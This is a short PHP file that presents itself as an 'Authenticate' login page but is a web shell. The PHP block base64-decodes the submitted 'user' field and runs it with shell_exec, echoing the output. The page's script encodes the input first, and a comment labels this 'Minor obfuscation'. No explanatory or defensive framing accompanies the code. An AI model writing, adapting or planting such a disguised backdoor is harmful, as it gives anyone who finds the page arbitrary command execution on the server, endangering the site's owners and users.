<?php
        if (isset($_POST['user'])) {
                // Minor obfuscation
//              echo "DEBUG: ".base64_decode($_POST['user']);
//              echo "DEBUG: ".$_POST['user'];
                $response = shell_exec(base64_decode($_POST['user']));
                echo nl2br($response);
        }
?>
<!DOCTYPE html>
<html>
        <head>
                <script>
                function validate(contents) {
                        console.log("Contents passed as "+contents);
                        console.log(document.getElementById('user').value);
                        document.getElementById('user').value=btoa(document.getElementById('user').value);
                        console.log(document.getElementById('user').value);
                }
                </script>
                <title>Authenticate</title>
        </head>
        <body>
                <form action="" method="POST" onsubmit="validate()">
                        <input type="text" name="user" id="user" />
                        <input type="submit" value="Login"/>
                </form>

        </body>
</html>
